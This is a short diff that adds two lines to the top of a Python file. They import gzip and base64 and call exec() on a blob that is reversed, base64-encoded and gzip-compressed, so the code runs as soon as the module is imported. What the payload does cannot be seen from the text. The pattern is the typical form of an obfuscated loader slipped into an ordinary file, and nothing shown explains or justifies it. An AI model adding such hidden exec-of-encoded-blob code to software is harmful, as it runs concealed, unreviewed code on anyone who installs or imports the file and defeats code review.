@@ -1,0 +1,2 @@
+import gzip,base64
+exec(gzip.decompress(base64.b64decode('=AAAAkr1l4CgfIKXqhHXdo3NOVtJbyuQU+ID0/xBOpD8rQLmf6Ys2/X5PU5Z2yJ7YZU1vLxE2pQ4ePDXgDlzBzLIfxIZRwesZjnvM1AqRLIU2YgKyQoUouEVK3cvYPyJSTqY74HRVQ75kwufTFAnbcprIivEfJ468scyrCTx8yDTGRrNWaSxlmIcnUp0irE0+DZQg46lF3z9FgBMC6QTL2y/CoG9fuKAIs4H'[::-1])))
